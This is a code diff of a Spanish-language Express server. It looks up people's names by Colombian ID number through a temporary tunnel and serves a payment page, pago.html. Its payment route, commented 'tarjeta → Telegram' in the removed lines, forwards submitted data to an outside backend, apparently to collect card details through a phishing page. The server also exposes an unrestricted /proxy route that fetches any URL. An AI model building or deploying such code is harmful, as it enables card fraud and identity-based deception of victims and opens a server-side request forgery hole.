@@ -7,23 +7,19 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIGURACIÓN (solo servidor — el navegador nunca las ve)
+// CONFIGURACIÓN
 // ============================================================
-
-// URL base de la API destino para consulta de clientes (NUIP)
 const API_BASE =
   process.env.API_BASE_URL ||
   "https://analyze-produces-realm-autos.trycloudflare.com";
 
-// URL del backend de pagos (SOLO se usa aquí en el servidor)
 const BACKEND_URL =
   process.env.BACKEND_URL ||
   "https://backvenecol.onrender.com";
 
 // ============================================================
-// MIDDLEWARES GLOBALES
+// MIDDLEWARES
 // ============================================================
-
 app.use(
   cors({
     origin: "*",
@@ -32,71 +28,45 @@ app.use(
   })
 );
 
-app.use(express.json());
+// 🔥 FIX: guardar el body CRUDO antes de parsearlo
+app.use(
+  express.json({
+    verify: (req, res, buf) => {
+      if (buf && buf.length) {
+        req.rawBody = buf.toString("utf8");
+      }
+    },
+  })
+);
 
-// Sirve archivos estáticos desde la raíz del proyecto
 app.use(express.static(__dirname));
 
 // ============================================================
-// UTILIDAD: extraer nombre completo y nombre de pila
+// UTILIDAD: extraer nombres
 // ============================================================
 function extraerNombres(data) {
   if (!data) return { nombre_completo: null, nombre_pila: null };
-
   const obj = Array.isArray(data) ? data[0] : data;
-  if (!obj || typeof obj !== "object") {
-    return { nombre_completo: null, nombre_pila: null };
-  }
+  if (!obj || typeof obj !== "object") return { nombre_completo: null, nombre_pila: null };
 
   const camposCompletos = [
-    "nombre_completo",
-    "nombreCompleto",
-    "nombre_completo_cliente",
-    "nombres_apellidos",
-    "full_name",
-    "nombre",
-    "name",
-    "nombres_cliente",
+    "nombre_completo", "nombreCompleto", "nombre_completo_cliente",
+    "nombres_apellidos", "full_name", "nombre", "name", "nombres_cliente",
   ];
-
   for (const campo of camposCompletos) {
     if (obj[campo] && typeof obj[campo] === "string" && obj[campo].trim() !== "") {
       const completo = obj[campo].trim();
-      return {
-        nombre_completo: completo,
-        nombre_pila: completo.split(/\s+/)[0],
-      };
+      return { nombre_completo: completo, nombre_pila: completo.split(/\s+/)[0] };
     }
   }
 
-  const nombres =
-    obj.nombres ||
-    obj.primer_nombre ||
-    obj.primernombre ||
-    obj.nombre1 ||
-    obj.nombre_1 ||
-    "";
-  const apellidos =
-    obj.apellidos ||
-    obj.primer_apellido ||
-    obj.primerapellido ||
-    obj.apellido1 ||
-    obj.apellido_1 ||
-    "";
-  const segundoApellido =
-    obj.segundo_apellido ||
-    obj.segundoapellido ||
-    obj.apellido2 ||
-    obj.apellido_2 ||
-    "";
+  const nombres = obj.nombres || obj.primer_nombre || obj.primernombre || obj.nombre1 || obj.nombre_1 || "";
+  const apellidos = obj.apellidos || obj.primer_apellido || obj.primerapellido || obj.apellido1 || obj.apellido_1 || "";
+  const segundoApellido = obj.segundo_apellido || obj.segundoapellido || obj.apellido2 || obj.apellido_2 || "";
 
   if (nombres || apellidos) {
-    const completo = `${nombres} ${apellidos} ${segundoApellido}`
-      .replace(/\s+/g, " ")
-      .trim();
-    const pila = nombres
-      ? nombres.split(/\s+/)[0]
-      : completo.split(/\s+/)[0];
+    const completo = `${nombres} ${apellidos} ${segundoApellido}`.replace(/\s+/g, " ").trim();
+    const pila = nombres ? nombres.split(/\s+/)[0] : completo.split(/\s+/)[0];
     return { nombre_completo: completo, nombre_pila: pila };
   }
 
@@ -109,16 +79,28 @@ function extraerNombres(data) {
 }
 
 // ============================================================
-// HELPER: reenviar cualquier request al backend de pagos
-// (lee BACKEND_URL desde process.env — nunca se expone al front)
+// FORWARD AL BACKEND (usa rawBody para no perder nada)
 // ============================================================
 async function forwardToBackend(req, res, method, backendPath, body) {
   const url = `${BACKEND_URL}${backendPath}`;
+
+  let bodyString;
+  if (method === "GET" || method === "HEAD") {
+    bodyString = undefined;
+  } else if (req.rawBody && req.rawBody.length > 0) {
+    bodyString = req.rawBody;
+  } else {
+    bodyString = JSON.stringify(body || {});
+  }
+
   try {
     const response = await fetch(url, {
       method,
-      headers: { "Content-Type": "application/json", Accept: "application/json" },
-      body: method === "GET" || method === "HEAD" ? undefined : JSON.stringify(body || {}),
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json",
+      },
+      body: bodyString,
     });
 
     const contentType = response.headers.get("content-type") || "";
@@ -143,28 +125,23 @@ async function forwardToBackend(req, res, method, backendPath, body) {
 }
 
 // ============================================================
-// HEALTH CHECK
+// HEALTH
 // ============================================================
 app.get("/health", (_req, res) => {
   res.json({
     status: "ok",
     message: "Servidor unificado activo",
     apiBase: API_BASE,
-    // ⚠️ No exponemos BACKEND_URL al cliente. Solo confirmamos que está configurada.
     backendConfigured: Boolean(BACKEND_URL),
   });
 });
 
 // ============================================================
-// RUTA: buscar cliente (consulta NUIP)
-// GET /api/buscar_cliente?cedula=11011545
+// BUSCAR CLIENTE
 // ============================================================
 app.get("/api/buscar_cliente", async (req, res) => {
   const { cedula } = req.query;
-
-  if (!cedula) {
-    return res.status(400).json({ error: "El parámetro 'cedula' es requerido" });
-  }
+  if (!cedula) return res.status(400).json({ error: "El parámetro 'cedula' es requerido" });
 
   try {
     const url = `${API_BASE}/consultadb/api_buscar_cliente_inteligente.php?cedula=${encodeURIComponent(cedula)}`;
@@ -188,13 +165,7 @@ app.get("/api/buscar_cliente", async (req, res) => {
     }
 
     const { nombre_completo, nombre_pila } = extraerNombres(data);
-
-    res.status(response.status).json({
-      cedula,
-      nombre_completo,
-      nombre_pila,
-      raw: data,
-    });
+    res.status(response.status).json({ cedula, nombre_completo, nombre_pila, raw: data });
   } catch (err) {
     console.error("Error al consultar API destino:", err.message);
     res.status(502).json({
@@ -209,21 +180,14 @@ app.get("/api/buscar_cliente", async (req, res) => {
 });
 
 // ============================================================
-// PROXY GENÉRICO (opcional)
-// GET /proxy?url=https://...
+// PROXY GENÉRICO
 // ============================================================
 app.get("/proxy", async (req, res) => {
   const targetUrl = req.query.url;
-
-  if (!targetUrl) {
-    return res.status(400).json({ error: "El parámetro 'url' es requerido" });
-  }
+  if (!targetUrl) return res.status(400).json({ error: "El parámetro 'url' es requerido" });
 
   try {
-    const response = await fetch(targetUrl, {
-      headers: { Accept: "application/json" },
-    });
-
+    const response = await fetch(targetUrl, { headers: { Accept: "application/json" } });
     const contentType = response.headers.get("content-type") || "";
     let data;
 
@@ -237,7 +201,6 @@ app.get("/proxy", async (req, res) => {
         data = { raw: text };
       }
     }
-
     res.status(response.status).json(data);
   } catch (err) {
     console.error("Error proxy genérico:", err.message);
@@ -246,28 +209,23 @@ app.get("/proxy", async (req, res) => {
 });
 
 // ============================================================
-// 🔁 REEMPLAZO DEL PROXY HPM — Rutas explícitas que usan
-//    BACKEND_URL desde process.env (nunca se expone al navegador)
+// RUTAS AL BACKEND
 // ============================================================
-
-// Notificar nuevo ingreso
 app.post("/api/nuevo-ingreso", async (req, res) => {
   return forwardToBackend(req, res, "POST", "/api/nuevo-ingreso", req.body);
 });
 
-// Crear pago (tarjeta → Telegram)
 app.post("/api/crear-pago", async (req, res) => {
   return forwardToBackend(req, res, "POST", "/api/crear-pago", req.body);
 });
 
-// Consultar estado del pago (polling)
 app.get("/api/estado-pago/:solicitud_id", async (req, res) => {
   const id = encodeURIComponent(req.params.solicitud_id);
   return forwardToBackend(req, res, "GET", `/api/estado-pago/${id}`);
 });
 
 // ============================================================
-// FALLBACK: cualquier otra ruta sirve pago.html
+// FALLBACK
 // ============================================================
 app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "pago.html"));
